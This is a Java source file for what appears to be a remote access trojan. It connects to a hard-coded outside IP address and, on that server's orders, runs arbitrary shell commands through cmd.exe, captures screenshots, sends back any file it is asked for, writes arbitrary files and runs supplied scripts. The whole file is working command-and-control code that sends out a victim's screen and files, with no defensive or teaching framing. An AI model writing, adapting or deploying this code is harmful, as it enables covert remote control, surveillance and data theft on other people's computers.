import ParserPackage.Collection;
import ParserPackage.Parser;
import org.json.simple.JSONObject;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class Main {
    public static void main(String[] args) throws IOException {
        System.out.println(SocketHandler.getMACAddress());

        SocketHandler socketHandler = SocketHandler.connect("3.89.196.174", 8080);
        socketHandler.setOnDataListener(data -> {
            int id = data.getId();
            if (data.getType().equals("command")) {
                String command = ((String) data.getMap().get("command")).replaceAll("\"", "^\"");
                ProcessBuilder processBuilder = new ProcessBuilder();
                processBuilder.command("cmd.exe", "/c", "\"" + command + "\"");
                new Thread(() -> {
                    try {
                        Process process = processBuilder.start();
                        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        StringBuilder stringBuilder = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null) stringBuilder.append(line).append("\n");
                        JSONObject result = new JSONObject();
                        result.put("type", "result");
                        result.put("result", stringBuilder.toString());
                        result.put("id", id);
                        result.put("success", true);
                        socketHandler.write(result.toString());
                    } catch (IOException e) {
                        JSONObject result = new JSONObject();
                        result.put("type", "result");
                        result.put("id", id);
                        result.put("success", false);
                        result.put("error", e.getMessage());
                        socketHandler.write(result.toString());
                        e.printStackTrace();
                    }
                }).start();
            } else if (data.getType().equals("psl")) {
                String psl = (String) data.getMap().get("command");
                try {
                    FileWriter fileWriter = new FileWriter("program.psl");
                    fileWriter.write(psl);
                    fileWriter.close();
                    PrintStream systemOut = System.out;
                    ByteArrayOutputStream out = new ByteArrayOutputStream();
                    System.setOut(new PrintStream(out));
                    Parser.interpret("program.psl");
                    System.setOut(systemOut);
                    JSONObject result = new JSONObject();
                    result.put("type", "result");
                    result.put("result", out.toString());
                    result.put("id", id);
                    result.put("success", true);
                    socketHandler.write(result.toString());
                } catch (Exception e) {
                    JSONObject result = new JSONObject();
                    result.put("type", "result");
                    result.put("id", id);
                    result.put("success", false);
                    result.put("error", e.getMessage());
                    socketHandler.write(result.toString());
                    e.printStackTrace();
                }
            } else if (data.getType().equals("screenshot")) {
                try {
                    BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                    ImageIO.write(image, "PNG", outputStream);
                    String base64 = Base64.getEncoder().encodeToString(outputStream.toByteArray());
                    JSONObject result = new JSONObject();
                    result.put("type", "result");
                    result.put("base64", base64);
                    result.put("id", id);
                    result.put("success", true);
                    socketHandler.write(result.toString());
                } catch (AWTException | IOException e) {
                    JSONObject result = new JSONObject();
                    result.put("type", "result");
                    result.put("id", id);
                    result.put("success", false);
                    result.put("error", e.getMessage());
                    socketHandler.write(result.toString());
                    e.printStackTrace();
                }
            } else if (data.getType().equals("get_file")) {
                try {
                    String path = (String) data.getMap().get("path");
                    File file = new File(path);
                    InputStream inputStream = new FileInputStream(file);
                    byte[] byteArray = new byte[(int) file.length()];
                    inputStream.read(byteArray);
                    String base64 = Base64.getEncoder().encodeToString(byteArray);
                    JSONObject result = new JSONObject();
                    result.put("type", "result");
                    result.put("base64", base64);
                    result.put("id", id);
                    result.put("success", true);
                    socketHandler.write(result.toString());
                } catch (IOException e) {
                    JSONObject result = new JSONObject();
                    result.put("type", "result");
                    result.put("id", id);
                    result.put("success", false);
                    result.put("error", e.getMessage());
                    socketHandler.write(result.toString());
                    e.printStackTrace();
                }
            } else if (data.getType().equals("write_file")) {
                try {
                    String path = (String) data.getMap().get("path");
                    String base64 = (String) data.getMap().get("base64");
                    System.out.println(base64.length());
                    System.out.println(base64);
                    String buffer = new String(Base64.getDecoder().decode(base64), StandardCharsets.UTF_8);
                    FileWriter fileWriter = new FileWriter(path);
                    fileWriter.write(buffer);
                    fileWriter.close();
                    JSONObject result = new JSONObject();
                    result.put("type", "result");
                    result.put("id", id);
                    result.put("success", true);
                    socketHandler.write(result.toString());
                } catch (IOException e) {
                    JSONObject result = new JSONObject();
                    result.put("type", "result");
                    result.put("id", id);
                    result.put("success", false);
                    result.put("error", e.getMessage());
                    socketHandler.write(result.toString());
                    e.printStackTrace();
                }
            }
        });
    }
}
